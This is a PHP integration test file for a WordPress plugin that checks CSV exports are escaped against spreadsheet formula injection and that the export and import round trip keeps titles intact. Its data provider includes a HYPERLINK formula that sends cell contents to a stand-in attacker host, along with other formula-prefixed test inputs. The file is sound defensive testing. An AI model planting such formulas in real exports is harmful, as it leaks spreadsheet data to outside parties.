<?php
/**
 * CSV exports that cannot run formulas, and a round trip that loses nothing (#99).
 *
 * The product export wrote titles, excerpts and notes straight into cells, so
 * a Contributor could plant a formula an administrator would run by opening
 * the file. Escaping it is only half the fix: this CSV is imported again, and
 * an escape that is not reversed on the way in corrupts real titles.
 */

declare(strict_types=1);

namespace ProducerKit\Tests\Integration;

use WP_UnitTestCase;

use ProducerKit\Core\Csv;

class CsvSafetyTest extends WP_UnitTestCase {

	public function set_up(): void {
		parent::set_up();

		\ProducerKit\Core\Post_Types\register();
		\ProducerKit\Core\Taxonomies\register();
	}

	/**
	 * Values a real catalogue could contain, including hostile ones.
	 *
	 * @return array<string, array{0: string}>
	 */
	public static function awkward_values(): array {
		return [
			'formula'                 => [ '=HYPERLINK("https://attacker.example/?"&A2,"open")' ],
			'plus'                    => [ '+1 Honey Bundle' ],
			'minus'                   => [ '-40° Frozen Berries' ],
			'at'                      => [ '@home Raw Honey' ],
			'tab'                     => [ "\tTabbed" ],
			'plain'                   => [ 'Country Sourdough' ],
			'negative number'         => [ '-5' ],
			'apostrophe that is data' => [ "'Heirloom' Tomatoes" ],
			'empty'                   => [ '' ],
		];
	}

	/**
	 * @dataProvider awkward_values
	 */
	public function test_unescape_exactly_reverses_escape( string $value ): void {
		$this->assertSame( $value, Csv\unescape_field( Csv\escape_field( $value ) ) );
	}

	/**
	 * What a spreadsheet would run, it no longer receives.
	 */
	public function test_a_formula_never_reaches_a_cell_unescaped(): void {
		foreach ( [ '=1+1', '+SUM(A1)', '-2+3', '@A1', "\tX", "\rY" ] as $hostile ) {
			$this->assertStringStartsWith( "'", Csv\escape_field( $hostile ), "Unescaped: {$hostile}" );
		}
	}

	/**
	 * A price is data. Escaping it would stop a numeric column importing as
	 * numbers.
	 */
	public function test_numbers_are_left_alone(): void {
		foreach ( [ '-5', '12.50', '0', '-0.99' ] as $number ) {
			$this->assertSame( $number, Csv\escape_field( $number ) );
		}
	}

	/**
	 * The apostrophe is only stripped where escape_field() would have put one.
	 */
	public function test_an_apostrophe_that_is_part_of_the_data_survives(): void {
		$this->assertSame( "'Heirloom' Tomatoes", Csv\unescape_field( "'Heirloom' Tomatoes" ) );
	}

	/**
	 * The whole journey: a hostile title and a merely awkward one go out through
	 * write_row(), come back through the real parse_csv() and import_rows(), and
	 * land as exactly the text they started as.
	 *
	 * @dataProvider awkward_values
	 */
	public function test_export_then_import_preserves_every_title( string $title ): void {
		if ( '' === trim( $title ) ) {
			$this->markTestSkipped( 'Import skips rows without a title.' );
		}

		wp_set_current_user( self::factory()->user->create( [ 'role' => 'administrator' ] ) );

		$file = (string) wp_tempnam( 'pkit-csv' );
		$out  = fopen( $file, 'w' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fopen

		Csv\write_row( $out, [ 'title', 'status', 'excerpt', 'price', 'unit', 'production_notes' ] );
		Csv\write_row( $out, [ $title, 'publish', '', '-5', 'jar', '' ] );
		fclose( $out ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose

		$raw = (string) file_get_contents( $file ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents
		$this->assertStringNotContainsString(
			"\n=",
			$raw,
			'A cell began with = in the file itself.'
		);

		\ProducerKit\Core\ProductIO\import_rows( \ProducerKit\Core\ProductIO\parse_csv( $file ) );
		unlink( $file );

		$found = get_posts(
			[
				'post_type'   => 'pkit_product',
				'post_status' => 'any',
				'numberposts' => 1,
				'orderby'     => 'ID',
				'order'       => 'DESC',
			]
		);

		$this->assertNotEmpty( $found, 'The row did not import.' );
		$this->assertSame(
			sanitize_text_field( $title ),
			$found[0]->post_title,
			'The title changed on the way through export and import.'
		);
		$this->assertSame( '-5', (string) get_post_meta( $found[0]->ID, '_pkit_price', true ), 'A number was escaped.' );
	}

	/**
	 * PHP 8.4 deprecated the implicit $escape. With display errors on, the
	 * notice is printed into the download, ahead of the data.
	 */
	public function test_reading_and_writing_raise_no_deprecation(): void {
		$raised = [];
		set_error_handler(
			static function ( int $errno, string $message ) use ( &$raised ): bool {
				$raised[] = $message;
				return true;
			},
			E_DEPRECATED | E_USER_DEPRECATED
		);

		$handle = fopen( 'php://memory', 'w+' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fopen
		Csv\write_row( $handle, [ 'a', 'b' ] );
		rewind( $handle );
		Csv\read_row( $handle );

		restore_error_handler();

		$this->assertSame( [], $raised );
	}

	/**
	 * The fix only holds while every CSV goes through one place. A future
	 * export written with a bare fputcsv() would reopen #99 silently.
	 */
	public function test_nothing_writes_or_reads_csv_any_other_way(): void {
		$root = dirname( __DIR__, 2 );
		$hits = [];

		foreach ( [ 'includes', 'modules' ] as $dir ) {
			$files = new \RecursiveIteratorIterator( new \RecursiveDirectoryIterator( $root . '/' . $dir ) );
			foreach ( $files as $file ) {
				if ( 'php' !== $file->getExtension() || str_ends_with( $file->getPathname(), 'includes/csv.php' ) ) {
					continue;
				}
				$code = (string) file_get_contents( $file->getPathname() ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents
				if ( preg_match( '/(?<![\w\\\\>])(fputcsv|fgetcsv|str_getcsv)\s*\(/', $code, $m ) ) {
					$hits[] = str_replace( $root . '/', '', $file->getPathname() ) . ': ' . $m[1];
				}
			}
		}

		$this->assertSame( [], $hits, 'CSV handled outside Core\\Csv, which escapes it.' );
	}
}
